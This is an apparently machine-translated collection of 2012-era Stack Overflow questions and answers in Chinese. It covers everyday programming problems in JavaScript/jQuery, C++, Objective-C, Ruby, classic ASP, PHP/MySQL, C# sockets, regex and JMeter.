我在链解析器和 URL 解析器中使用了 latest="latest-time"。然而这还不够，当我调试代码时，我发现每个解析器都根据自己的“最新”来判断。所以我像这样覆盖了本地存储库：

```
<filesystem name="local" latest="latest-time" > 
    <ivy pattern="${ivy.local.default.root}/${ivy.local.default.ivy.pattern}"/>
    <artifact pattern="${ivy.local.default.root}/${ivy.local.default.artifact.pattern}"/>
</filesystem> 
```

# javascript - 打开相对文本文件javascript

> ID：11052684
> 
> 赞同：1
> 
> 时间：2012-06-15T14:30:02.620
> 
> 标签：javascript, text

如何使用 javascript 读取位于我网站的相对路径中的文本文件？

这就是我一直在尝试做的事情，它说访问被拒绝：

```
this.load = function(path){
    if(root == null){
        root = path;
    }

    var client = new XMLHttpRequest();

    client.open('GET', "assets/myTextFile.txt");
    client.onreadystatechange = function() {
        alert(client.responseText);
    };

    client.send();

}; 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T15:22:24.553

如果你使用 jquery：

```
$.ajax({
  url: "assets/myTextFile.txt",
  success: function(data){
    alert(data);
  }
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T15:30:23.520

请尝试以下代码：

```
var xmlhttp;

if(window.XMLHttpRequest) {
    xmlhttp=new XMLHttpRequest();
}
else {
    xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange=function() {
    if (xmlhttp.readyState==4 && xmlhttp.status==200) {
        alert(xmlhttp.responseText);
    }
}

xmlhttp.open("GET","assets/myTextFile.txt",true);
xmlhttp.send(); 
```

# c++ - 读取 .csv 科学记数法

> ID：11052685
> 
> 赞同：0
> 
> 时间：2012-06-15T14:30:04.653
> 
> 标签：c++, csv

我正在尝试读取此 .csv 文件，这是数据示例：

```
1.33286E+12 0   -20.790001  -4.49   -0.762739   -3.364226   -8.962189

1.33286E+12 0   -21.059999  -4.46   -0.721878   -3.255263   -8.989429 
```

问题出在第一列第 1 行和第 2 行。在 excel 文件中，它说单元格中的数字显示为 1.33286E+12，当您单击单元格时，它说它们是 1332856031313 和 1332856031328，但程序正在读取它们如 1.33286E+12 但我需要整数 1332856031313 和 1332856031328。

编码：

```
inputfile.open(word1.c_str());
while (getline (inputfile, line)) //while line reads good
{
  istringstream linestream(line); //allows manipulation of string
  string str;

while (getline (linestream, item, ',')) //extract character and store in item until ','
    {

  char * cstr, *p; 
  cstr = new char [item.size()+1]; 
  strcpy(cstr, item.c_str()); 
  p = strtok(cstr, " "); 

  while (p!=NULL) //while not at the end loop
    {      // double e = atof(p); // coverts p to double
        value++;
        if( value == 1)
                {     double e = atof(p); // coverts p to double
          if(m ==1)
          cout << time[0]<<"\n";

          ostringstream str1;
           str1 << e;
          str = str1.str();
          string str2;
          str2.append(str.begin(), str.end());
          const char * convert = str2.c_str();
          e = atof(convert);
         time[m] = e*0.001;
          m++;
          //if(m >=192542)
          //cout << time[m-1]<<"\n";

        }

               p = strtok(NULL, " ");
    }
  delete[] cstr; //delete cstr to free up space.
}
count ++;
value = 0;
}
inputfile.close(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:43:31.797

如果数字 1332856031313 被序列化为 1.33286E+12，则无法在反序列化过程中将其取回。这 6 个额外有效数字形式的信息永远消失了。您需要确保生成 CSV 文件时以全精度保存。我不知道您如何使用 Excel 做到这一点。

此外，您对`atof`and的使用`const char*`不是很 C++ 风格。考虑使用类似的代码

```
double a, b, c, d;
linestream >> a >> b >> c >> d; 
```

反而。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T15:43:20.007

Rook 打败了我，但我会提出一个建议。使用循环进行解码，测试字符串流状态。好的，有两个建议：将您的代码分解为函数。将所有内容放在一个大块中会更难理解。

```
 void DecodeLine(const std::string &sLine, 
                    std::vector<double> &vResults)
    {
        std::istringstream istr(sLine);
        double d = 0;
        istr >> d;
        while (!istr.fail())
        {
            vResults.push_back(d);
            istr >> d;
        }
    } 
```

# authentication - PageTab 应用程序中的多朋友选择器和身份验证对话框

> ID：11052691
> 
> 赞同：1
> 
> 时间：2012-06-15T14:30:30.153
> 
> 标签：authentication, facebook-javascript-sdk, selector, friend

我已经创建了一个页面选项卡应用程序，我已经在应用程序设置中的 Auth Dialog 下设置了所有参数。现在，当我通过我的应用程序发送好友请求，并且我的朋友点击应用程序请求时，他能够看到描述应用程序的身份验证框和请求的权限等。但是如果有人访问我添加了应用程序的页面，然后从那里单击应用程序，它会直接将用户带到页面选项卡，而不显示身份验证框。这是它应该如何从页面工作的方式吗？是否可以为从页面访问应用程序的用户显示身份验证框？

其次，我添加了一个多朋友选择器，默认情况下它会在弹出窗口中打开。是否可以在页面本身而不是弹出窗口中显示它？我尝试添加 display: 'page' 选项，但它可以正常工作。

我使用了相同的代码：[https ://developers.facebook.com/docs/reference/dialogs/requests/](https://developers.facebook.com/docs/reference/dialogs/requests/)

```
... 
<body>
<div id="fb-root"></div>

<p>
  <input type="button"
    onclick="sendRequestToRecipients(); return false;"
    value="Send Request to Users Directly"  />
  <input type="text" value="User ID" name="user_ids" />
  </p>
<p>
<input type="button"
  onclick="sendRequestViaMultiFriendSelector(); return false;"
  value="Send Request to Many Users with MFS" />
</p>

<script>
window.fbAsyncInit = function() {
  FB.init({
    appId      : XXXXXXXXXXX,
    status     : true, 
    cookie     : true,
    xfbml      : true,
    oauth      : true,
  });
};
(function(d){
   var js, id = 'facebook-jssdk'; 
   if (d.getElementById(id)) {
       return;
       }
   js = d.createElement('script');
   js.id = id; 
   js.async = true;
   js.src = "//connect.facebook.net/en_US/all.js";
   d.getElementsByTagName('head')[0].appendChild(js);
 }(document));
</script>

<script>
function sendRequestToRecipients() {
        var user_ids = document.getElementsByName("user_ids")[0].value;
        FB.ui({method: 'apprequests',
          message: 'My Great Request',
          to: user_ids, 
        }, requestCallback);
      }

      function sendRequestViaMultiFriendSelector() {
        FB.ui({method: 'apprequests',
          message: 'My Great Request'
        }, requestCallback);
      }

      function requestCallback(response) {
        // Handle callback here
      }
</script>
... 
```

非常感谢这方面的任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T18:29:59.400

> 这是它应该如何从页面工作的方式吗？

是的。当直接从页面访问应用程序时，经过身份验证的推荐不起作用。

> 是否可以为从页面访问应用程序的用户显示身份验证框？

当然——分析 signed_request 参数，并做出相应的反应（意思是，自己显示身份验证对话框，服务器端或客户端）。

# ruby-on-rails - 为什么变量 == "false" 不能正常工作？

> ID：11052692
> 
> 赞同：0
> 
> 时间：2012-06-15T14:30:34.937
> 
> 标签：ruby-on-rails, haml

1)

```
- @client.getAvatars(@accountName).each do |avatar|
  =avatar['deleted'] 
```

输出：假假真

2)

```
- @client.getAvatars(@accountName).each do |avatar|
 - if(avatar['deleted'] == 'false')
   =avatar['deleted'] 
```

空输出

3)

```
- @client.getAvatars(@accountName).each do |avatar|
 - if(avatar['deleted'] != 'false')
   =avatar['deleted'] 
```

输出：假假真

我不明白它为什么如此奇怪，你能给我解释一下吗？

PS：我的工作变体是

```
- @client.getAvatars(@accountName).each do |avatar|
 - if(!avatar['deleted'])
   =avatar['deleted'] 
```

输出：假假

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:43:14.963

我认为问题在于您认为`avatar['deleted']`返回一个字符串（单词“false”或单词“true”），而实际上返回的是一个布尔值。

试试这个代码：

```
- @client.getAvatars(@accountName).each do |avatar|
    - if(avatar['deleted'] == false) # or, if(avatar['deleted'])
        =avatar['deleted'] 
```

请注意，这`false`不是字符串，而是关键字：它是一个布尔标志。现在你应该得到与你的第一个场景更好地吻合的输出。

# objective-c - 获取 NSString 的最后一个单词

> ID：11052700
> 
> 赞同：8
> 
> 时间：2012-06-15T14:31:02.330
> 
> 标签：objective-c, ios

正如标题所暗示的，我想从 NSString 中得到最后一句话。我想使用这段代码：

```
NSArray *listItems = [someNSStringHere componentsSeparatedByString:@" "];
NSString *lastWordString = [NSString stringWithFormat:@"%@", listItems.lastObject];
anotherNSStringHere = lastWordString; 
```

但是我认为如果 NSArray 很大（而且很大），加载它需要一些时间，并且它不会识别用逗号分隔的单词。

感谢您的帮助！

* * *

## 回答 #1

> 赞同：29
> 
> 时间：2012-06-15T14:52:24.680

如果你想变得超级健壮：

```
__block NSString *lastWord = nil;

[someNSStringHere enumerateSubstringsInRange:NSMakeRange(0, [someNSStringHere length]) options:NSStringEnumerationByWords | NSStringEnumerationReverse usingBlock:^(NSString *substring, NSRange subrange, NSRange enclosingRange, BOOL *stop) {
    lastWord = substring;
    *stop = YES;
}]; 
```

（这也适用于非罗马语言；iOS 4+/OS X 10.6+。）

基本解释：

`-enumerateSubstringsInRage:options:usingBlock:`做它在锡上所说的：它枚举子字符串，这些子字符串由您作为选项传入的内容定义。`NSStringEnumerationByWords`说“我想要给我的话”，并`NSStringEnumerationReverse`说“从字符串的末尾而不是开头开始”。

由于我们是从末尾开始的，所以 in 给我们的第一个单词`substring`将是字符串中的最后一个单词，所以我们设置`lastWord`为 that，然后将`BOOL`指向的 by设置`stop`为 YES，因此枚举立即停止。

`lastWord`当然定义为`__block`这样我们可以将它设置在块内并在块外看到它，并且它被初始化为`nil`所以如果字符串*没有*单词（例如，如果它是空的或全是标点符号）我们在尝试使用时不会崩溃`lastWord`.

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-06-15T14:41:01.480

试试这个：

```
NSRange range = [someNSStringHere rangeOfString:@" " options:NSBackwardsSearch];
NSString *result = [someNSStringHere substringFromIndex:range.location+1]; 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-06-15T15:32:23.207

如果您想使用正则表达式（如果您想在字符串结尾处查找的内容变得更加复杂，这可能很有用），您可以执行以下操作：

```
NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"\\S+\\Z" options:0 error:nil];
NSTextCheckingResult *found = [regex firstMatchInString:inputString options:0 range:NSMakeRange(0, [inputString length])];

if (found.range.location != NSNotFound)
    result = [inputString substringWithRange:found.range]; 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2014-04-03T19:55:14.593

这很好用，因为它还可以识别 @ 和 # 之类的符号，这些符号`enumerateSubstringsInRange:`不起作用。

```
NSCharacterSet *charSet = [NSCharacterSet whitespaceAndNewlineCharacterSet];
NSArray *components = [someString componentsSeparatedByCharactersInSet:charSet];
NSString *lastWord = components.lastObject; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-15T14:36:44.263

最有效的方法可能是从字符串的末尾开始，检查每个字符以查看它是否是您定义为单词的一部分，然后使用`substringFromIndex:`or提取您想要的单词`substringWithRange:`。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-15T14:34:27.010

您可以从字符串末尾读取符号并将它们复制到 0 索引到结果字符串。无论您阅读空格还是逗号，结果字符串都将包含最后一个单词

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-06-15T14:44:38.637

您可以使用`NSString`' 函数`rangeOfSubstring:options:`来确定它。例如：

在字符串中搜索空格，使用向后搜索选项从字符串末尾开始搜索。

`NSRange r = [string rangeOfString:@" " options:NSBackwardsSearch];`

这将找到字符串最后一个单词的位置。现在只需使用`substringWithRange:`例如获取字符串：

`NSRange found = NSMakeRange(NSMaxRange(r), string.length - NSMaxRange(r)); NSString *foundString = [string substringWithRange:found];`

`r`之前的范围在哪里。

还要小心确保您检查`r`确实存在。`r`如果字符串中只有 1 个单词，则为`{NSNotFound, 0}`

希望我能帮上忙！

本

# jquery - 获取用户选择新单选按钮之前选择的单选按钮的值

> ID：11052702
> 
> 赞同：17
> 
> 时间：2012-06-15T14:31:16.447
> 
> 标签：jquery, radio-button

如果我有 3 个单选按钮，是否有办法通过 jQuery 找出在用户单击新按钮之前选择的单选按钮的值？

```
<div id="radio-group">
    <input type="radio" id="radio-1" name="radios" value="1" checked="true" />
    <input type="radio" id="radio-2" name="radios" value="2" />
    <input type="radio" id="radio-3" name="radios" value="3" />
</div> 
```

在上面的例子中，如果用户点击`radio-3`，我需要一个获取的方法`1`，以便我可以对其进行一些格式化。谢谢。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-06-15T14:33:19.380

您可以使用`mouseup`和`change`事件。在鼠标向上时，您将获得`radio`在选择其他单选按钮之前选择的按钮的值，并且更改事件将给出新的`radio`按钮选择。

**[现场演示](http://jsfiddle.net/DYrW3/1/)**

```
$('input[name=radios]').mouseup(function(){
    alert("Before change "+$('input[name=radios]:checked').val());
}).change(function(){
    alert("After change "+$('input[name=radios]:checked').val());
})​; 
```

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-06-15T14:42:46.553

我会将按下的值保存到一个数组中并用它来编辑隐藏的值。

[http://jsfiddle.net/BQDdJ/6/](http://jsfiddle.net/BQDdJ/6/)

HTML

```
<div id="radio-group">
    <input type="radio" id="radio-1" name="radios" value="1" checked="true" />
    <input type="radio" id="radio-2" name="radios" value="2" />
    <input type="radio" id="radio-3" name="radios" value="3" />
    <input type="hidden" id="radio-previous" name="radio-previous" />
</div>​ 
```

JavaScript

```
$(document).ready(function(){
    var clicks = new Array();
    clicks[0] = 1 //this should be the default value, if there is one

    $('input[name$="radios"]').change(function(){
       clicks.push($(this).val()) 
       $('#radio-previous').val(clicks[clicks.length-2])
    })
}) 
```

​</p>

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-03-05T17:25:54.240

“已经有一段时间了”是一种委婉说法，但万一有人偶然发现了这个问题：

[Adil](https://stackoverflow.com/a/11052752/4770813)为我指出了正确的方向，但`mouseup`仅适用于鼠标触发的事件（duh），所以我尝试了`focus`并且，因为它也*发生*在`change`事件之前，它适用于鼠标和键盘输入（比如当你改变收音机时使用**制表符**和**箭头**键的状态）。因此，要在您使用的用户交互之前访问先前选择/检查的项目`focus`并获取您使用旧的当前项目`change`：

```
//html
    <input type="radio" id="radio-1" name="radios" value="1" />
    <input type="radio" id="radio-2" name="radios" value="2" />

//js
    //if currently checked item is radio-1
    $('[name=radios]').on('focus', function() {
        console.log($('[name="radios"]:checked').val()); //outputs 1
    });
    $('[name=radios]').change(function() {
        console.log($('[name="radios"]:checked').val()); //outputs 2
    }); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-01-10T16:28:27.397

我在尝试制作带有选项的预算计算器时遇到了同样的问题，我使用 aa var 来保存最后一个值来解决它；

```
 var before = -1;
            $('input:checkbox, input:radio').click(function() {
                // +(str) =  number(str)
                var value = +$(this).val();
                if ($(this).is(":checkbox")) {
                    if ($(this).is(":checked")) {
                        total += value;
                    } else {
                        total -= value;
                    }
                }
                else {
                    if (before < 0) {
                        total += value;
                        before = value;
                    } else {
                        total -= before;
                        total += value;
                        before = value;
                    }
                }
                $("#sub-total").text(total * hourly_rate);
                if ($(this).is("[data-toggle]")) {
                    $("#" + $(this).attr("data-toggle")).slideToggle("fast");
                }
            }); 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2016-03-18T11:36:09.230

只是为了完成#Adil 的回答，如果您有带有文本的收音机，如果用户单击文本，previousRadio 不会得到更新。您可以使用以下内容：

```
<label>
   <input type="radio" name="radioName">
   text
</label> 
```

和js：

```
var $previousRadio;
var $inputs = $('input[name=radioName]');
$inputs.parents("label").mouseup(function () {
    $previousRadio = $inputs.filter(':checked');
});
$inputs.change(function () {
    alert($previousRadio.val());
}); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2022-02-17T09:49:34.437

@Ville 对收音机的回答是正确的，这里是复选框

```
<div id="radio-group">
    <input type="checkbox" id="radio-1" name="radios" value="1" data-prev="false" />
    <input type="checkbox" id="radio-2" name="radios" value="2" data-prev="false" />
    <input type="checkbox" id="radio-3" name="radios" value="3" data-prev="false" />
</div> 
```

JS：

```
$('body').on("click", "[name='checkbox']", function () {
    $(this).attr("data-prev", this.checked);
}); 
```

# arrays - 确定一个数组中的值是否存在于经典 ASP 中的另一个数组中

> ID：11052707
> 
> 赞同：3
> 
> 时间：2012-06-15T14:31:27.727
> 
> 标签：arrays, asp-classic

我对 ASP 很陌生，它与我选择的语言相去甚远，完全超出了我的舒适区。

我有两个数组，我需要轻松确定第一个数组中的值是否存在于第二个数组中。我该怎么做？我什至不知道要搜索什么！

我确实创建了一个函数来确定数组中是否存在一个值，但据我所知：

```
Function in_array(element, arr)
    For i=0 To Ubound(arr) 
        If Trim(arr(i)) = Trim(element) Then 
            in_array = True
            Exit Function
        Else 
            in_array = False
        End If  
    Next 
End Function 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:52:33.590

幸运的是，我能够使用我以前的功能通过一些工作来解决这个问题！

以下是感兴趣的人的解决方案：

```
Function in_array(element, arr)
    For i=0 To Ubound(arr) 
        If Trim(arr(i)) = Trim(element) Then 
            in_array = True
            Exit Function
        Else 
            in_array = False
        End If  
    Next 
End Function 

Function array_in_array(arr1, arr2)

    For i=0 To Ubound(arr1) 
        If in_array(arr1(i), arr2 ) Then 
            array_in_array = True
            Exit Function
        Else 
            array_in_array = False
        End If  
    Next 

End Function 
```

# php - 提高代码的效率和速度？

> ID：11052708
> 
> 赞同：1
> 
> 时间：2012-06-15T14:31:27.947
> 
> 标签：php, mysql, wordpress

我已经编写了一些 php 代码，这些代码在效率和加载速度方面可能会有所提高。我该如何改进它？请记住，我绝不擅长编码！

目前页面加载大约需要 5-10 秒。

它在数百个 wordpress 帖子中循环，将它们放在一个新的 mysql 表中并对纬度/经度进行地理编码。它还在检查帖子是否已经在数据库中。

下面是代码：

```
<?php
require("database.php");
// Opens a connection to a MySQL server
$con = mysql_connect("localhost", $username, $password);

if (!$con)
{
    die('Could not connect: ' . mysql_error());
}

mysql_select_db("medicom_wp", $con);

$pages = get_posts(array(
    'orderby' => 'title', 
    'post_type' => 'members',
    'numberposts' => 300,
    'post_status' => 'any'  
    ));
foreach($pages as $post) {
    setup_postdata($post);

    $company = get_field('company_name');
    $address = get_field('address');
    $city = get_field('city');
    $post_code = get_field('post_code');

    $sql = sprintf("select count('x') as cnt from markers where `name` = '%s'", mysql_real_escape_string($company));
    $row_dup = mysql_fetch_assoc(mysql_query($sql,$con));
    if ($row_dup['cnt'] == 0) {
        mysql_query("INSERT INTO markers (`name`, `address`, `lat`, `lng`, `type`) VALUES ('".$company."', '".$address.", ".$city.", ".$post_code."', '0.0', '0.0', '')");
    }
}
wp_reset_query();

define("MAPS_HOST", "maps.google.com");
define("KEY", "");

// Opens a connection to a MySQL server
$connection = mysql_connect("localhost", $username, $password);
if (!$connection) {
  die("Not connected : " . mysql_error());
}

// Set the active MySQL database
$db_selected = mysql_select_db($database, $connection);
if (!$db_selected) {
  die("Can\'t use db : " . mysql_error());
}

// Select all the rows in the markers table
$query = "SELECT * FROM markers WHERE 1";
$result = mysql_query($query);
if (!$result) {
  die("Invalid query: " . mysql_error());
}

// Initialize delay in geocode speed
$delay = 0;
$base_url = "http://" . MAPS_HOST . "/maps/geo?output=xml" . "&key=" . KEY;

// Iterate through the rows, geocoding each address
while ($row = @mysql_fetch_assoc($result)) {
  $geocode_pending = true;

  while ($geocode_pending) {
    $address = $row["address"];
    $id = $row["id"];
    $request_url = $base_url . "&q=" . urlencode($address);
    $xml = simplexml_load_file($request_url) or die("url not loading");

    $status = $xml->Response->Status->code;
    if (strcmp($status, "200") == 0) {
      // Successful geocode
      $geocode_pending = false;
      $coordinates = $xml->Response->Placemark->Point->coordinates;
      $coordinatesSplit = split(",", $coordinates);
      // Format: Longitude, Latitude, Altitude
      $lat = $coordinatesSplit[1];
      $lng = $coordinatesSplit[0];

      $query = sprintf("UPDATE markers " .
             " SET lat = '%s', lng = '%s' " .
             " WHERE id = '%s' LIMIT 1;",
             mysql_real_escape_string($lat),
             mysql_real_escape_string($lng),
             mysql_real_escape_string($id));
      $update_result = mysql_query($query);
      if (!$update_result) {
        die("Invalid query: " . mysql_error());
      }
    } else if (strcmp($status, "620") == 0) {
      // sent geocodes too fast
      $delay += 1000;
    } else {
      // failure to geocode
      $geocode_pending = false;
      echo "Address " . $address . " failed to geocoded. ";
      echo "Received status " . $status . "
\n";
    }
    usleep($delay);
  }
}
?> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:36:22.223

您需要重组代码以使用[多插入](http://dev.mysql.com/doc/refman/5.5/en/insert.html)SQL 查询。这应该会大大提高性能。

而不是做这样的事情，数百次：

```
INSERT INTO table ( col1, col2) VALUES ( val1, val2)
INSERT INTO table ( col1, col2) VALUES ( val3, val4)
... 
```

你这样做，一次：

```
INSERT INTO table ( col1, col2) VALUES ( val1, val2), ( val3, val4) 
```

现在，让我们将它应用到您的代码中：

```
$values = array();

foreach($pages as $post) {
    setup_postdata($post);

    $company = get_field('company_name');
    $address = get_field('address');
    $city = get_field('city');
    $post_code = get_field('post_code');

    $values[] = "( '$company', '$address', '$city', '$post_code', 0.0, 0.0, '')";
}

$query = 'INSERT IGNORE INTO markers (`name`, `address`, `lat`, `lng`, `type`) 
              VALUES ' . implode( ', ', $values); 
```

现在，不要检查 SQL 行是否存在（使用该`$row_dup`查询），而是确保`name`列上有主键，然后执行`INSERT IGNORE`or `INSERT ... ON DUPLIACATE KEY UPDATE`。

[您可以从此SO question](https://stackoverflow.com/questions/548541/insert-ignore-vs-insert-on-duplicate-key-update)了解有关这些查询的更多信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:41:14.167

许多插入语句会减慢您的速度，如果您做了很多事情，您可以将数据解析为 csv 文件，然后使用 LOAD DATA INFILE 加载，在大型数据集的情况下，性能差异可能很大，

链接

[http://php.net/manual/en/function.fputcsv.php](http://php.net/manual/en/function.fputcsv.php)

[http://dev.mysql.com/doc/refman/5.1/en/load-data.html](http://dev.mysql.com/doc/refman/5.1/en/load-data.html)

@nickb 有一个建议肯定会有所帮助

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T18:45:55.337

您还可以通过缓存来自您的地理编码请求的数据来加快这一速度，以限制在下一次请求时对 Google 地理编码服务的调用次数。我通常会保存请求的时间以及请求的准确性或“location_type”。然后我检查每个标记的准确性以及从上次请求开始的时间，看看我是否应该更新信息。准确性越高，请求之间的时间就越长。

[https://developers.google.com/maps/documentation/geocoding/](https://developers.google.com/maps/documentation/geocoding/)

这是基本的，但您有几个准确度选项

```
if($accuracy != 'ROOFTOP' || time() > ($update_time + 2592000))//check every 30 days
{
    //make a geocode request
} 
```

ROOFTOP 的准确性与您使用 Google 的地理编码所获得的一样好。除非 Google 更改某些内容，否则无需继续更新。这就是我将其设置为 30 天的原因。

# c# - C# 客户端应用程序不接收来自 linux tcp 服务器的消息

> ID：11052709
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:31:28.540
> 
> 标签：c#, linux, tcp, client

情况： 1\. Linux TCP 服务器 2 Windows C# 客户端应用程序

服务器从客户端接收消息，但是当我尝试从服务器向客户端发送消息时没有任何反应。当我断开连接时，我收到错误：

“无法从传输连接读取数据：阻塞操作被对 WSACancelBlockingCall 的调用中断。” 它指向行---> string Response = swRead.ReadLine();

这是客户端代码：

```
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace AsynClient
{
    public partial class Form1 : Form
    {

        private TcpClient client;
        private StreamWriter swSend;
        private StreamReader swRead;

        private bool connected = false;
        string bojaTekst = "", bojaPoz = "";

        private delegate void UpdateLogCallback(string strMessage);

        private Thread thrMessag;

        public Form1()
        {
            Application.ApplicationExit += new EventHandler(OnApplicationExit);
            InitializeComponent();
      }

        private void btnConnect_Click(object sender, EventArgs e)
        {
            if (connected == false)
            {
                InitializeConnection();
            }
            else
                MessageBox.Show("Vec je uspostavljenja konekcija.");
        }

        private void InitializeConnection()
        {
            client = new TcpClient();
            client.Connect("192.168.100.82", 3456);
            swSend = new StreamWriter(client.GetStream()); //prvo mora da se             konektuje, pa onda ova komanda

            thrMessag = new Thread(new ThreadStart(ReceiveMessages));
            thrMessag.Start();

            connected = true;
            btnSend.Enabled = true;
            btnDisconnect.Enabled = true;
            txtMsg.Enabled = true;
            btnConnect.Enabled = false;

        }

        private void UpdateLog(string strMessage)
        {

            txtServ.AppendText(strMessage + "\r\n");

        }

        private void ReceiveMessages()
        {
            swRead = new StreamReader(client.GetStream());

            string Response = swRead.ReadLine();

            while (connected)
            {

                // Show the messages in the log TextBox

                this.Invoke(new UpdateLogCallback(this.UpdateLog), new object[] {         swRead.ReadLine() });

            }
        }

        private void btnSend_Click(object sender, EventArgs e)
        {

            if (listBoxTekst.SelectedIndex == -1)
                listBoxTekst.SelectedIndex = 0;

            if (listBoxPozadina.SelectedIndex == -1)
                listBoxPozadina.SelectedIndex = 0;

            bojaTekst = listBoxTekst.Text;
        bojaPoz = listBoxPozadina.Text;

        SendMessage();
    }

    private void SendMessage()
    {
     txtMsg.Text);

        if (txtMsg.Lines.Length >= 1)
        {
            swSend.WriteLine(bojaPoz + "\t" + bojaTekst + "\t" + txtMsg.Text + "\t"); 
            swSend.Flush();                     
            txtMsg.Lines = null;                
        }                                       
        txtMsg.Text = "";
    }

    private void btnDisconnect_Click(object sender, EventArgs e)
    {
        char[] quit = new char[5];
        quit[0] = 'q'; quit[1] = 'w'; quit[2] = 'w'; quit[3] = 'w'; quit[4] = '\0';
        connected = false;

        btnConnect.Enabled = true;
        btnSend.Enabled = false;
        btnDisconnect.Enabled = false;
        txtMsg.Enabled = false;

        swSend.WriteLine(quit);
        swSend.Flush();

        swSend.Close();
        client.Close();
    }

    public void OnApplicationExit(object sender, EventArgs e)
    {
        if (connected == true)
        {
            connected = false;

            swSend.WriteLine("qwww"); //proveri da li radi f-ja kako treba
            swSend.Flush();

            swSend.Close();
            client.Close();
        }
    }      
} 
```

}

服务器端使用 read() 函数接收消息并且工作正常，但是当它使用 write() 发送时，C# 客户端没有收到消息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:35:51.413

只有一件事（可能还有其他问题）：在启动监听线程后，您有一个`connected`变量，您将其设置为。`true`线程内的循环甚至没有运行一次。

```
thrMessag = new Thread(new ThreadStart(ReceiveMessages));   
thrMessag.Start();              
connected = true; //here is your first bug, should come before the previos line 
```

# javascript - jQuery：在提交之前验证字段（多步表单）

> ID：11052711
> 
> 赞同：4
> 
> 时间：2012-06-15T14:31:32.017
> 
> 标签：javascript, jquery, forms

我有一个包含两个步骤的表格。我想做的是在继续下一步之前验证每个步骤；用户应该无法进入第 1 步的第 2 步的字段无效。

**js fiddle： http: [//jsfiddle.net/Egyhc/](http://jsfiddle.net/Egyhc/)**
*下面你可以找到表单的简化版本：*

```
<form>
  <div id="step1" style="display: block;">
    <label for="first_name">First Name</label>
    <input type="text" value="" name="first_name" id="FirstName"/>

    <label for="last_name">Last Name</label>
    <input type="text" value="" name="last_name" id="LastName"/>
  </div>

  <div id="step2" style="display: none;">
    <label for="first_name">Address</label>
    <input type="text" value="" name="address" id="Address"/> 
  </div>

  <a href="#" id="step1_btn">Continue to step 2</a>
  <input type="submit" id="submit_btn" value="Verstuur" style="display: none;" />
</form> 
```

​</p>

```
$(function() {
  $('#step1_btn').click(function() {
    $('#step1').hide();
    $('#step2, #submit_btn').show();        
  });
});​ 
```

你们建议我如何实现这一目标？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-15T14:35:31.157

jQuery validate 有一个非常简洁的设置，可以让您忽略对隐藏字段的验证。因此，您可以处理步骤的显示/隐藏逻辑，并且为了验证，您可以这样做：

正如这表明：[忽略隐藏](https://stackoverflow.com/questions/2623514/jquery-validate-ignore-elements-with-style)

```
$("form").validate({
   ignore: ":hidden"
}); 
```

如果您需要检查除了默认表单提交之外的其他内容的验证，您可以使用如下`valid`方法：`$("form").valid()`.

我注意到您的表单上没有任何验证类，所以我假设您正在其他地方处理它。万一你不是，你可以告诉 jQuery 通过 css 类来验证你的规则，如下所示：`<input type="text" class="required digits"/>`

在此处查看更多信息：http: [//bassistance.de/2008/01/30/jquery-validation-plugin-overview/](http://bassistance.de/2008/01/30/jquery-validation-plugin-overview/)

# regex - 正则表达式输出异常

> ID：11052714
> 
> 赞同：0
> 
> 时间：2012-06-15T14:31:43.633
> 
> 标签：regex, irb, rubular

我在正则表达式匹配 1) 使用 Rubular 时和 2) 在使用 rails 控制台或 irb 环境时有不同的输出。

1) 红色

```
/\w+/ on test string "---\n- nicidnut\n" matches "    n  nicidnut n" 
(I have shown only matched part and put spaces for unmatched string characters) 
```

2）IRB

```
(/\w+/).match("---\n- nicidnut\n") produces "nicidnut". 
```

我不明白为什么有两个不同的输出，我错过了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:43:06.257

`\n`on Rubular 被视为文字字符串（因为您在文本视图中输入）。但在实际开发环境中，在一个字符串中，`\n`是转义换行符。`"---\n- nicidnut\n"`实际上也是这样：

```
---
- nicidnut 
```

如 irb 中所见。

# java - 使用 jmeter 设置我们的问卷测试

> ID：11052715
> 
> 赞同：0
> 
> 时间：2012-06-15T14:31:44.880
> 
> 标签：java, jmeter

我之前使用过 jmeter，刚刚下载了 jmeter 2.7。

我们的网络应用程序有一个每个人都填写的问卷。与大多数问卷一样，显示的问题取决于对先前问题的回答，因此有多种途径，很少有人能看到所有问题。

我想做的是创建一个控制文件，该文件将指定一组问卷，它将加载并将这些人记录到系统中，并填写问卷检查最后的路径和结果，以确保存储答案适当地。

我想同时拥有 25 个用户。最终我想拥有几百个。

我如何开始通过 jmeter 设置所有这些？我的意思不是演练，但我对一些 jmeter 组件有点熟悉。我将使用哪些组件来解决这个问题以及以什么顺序？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
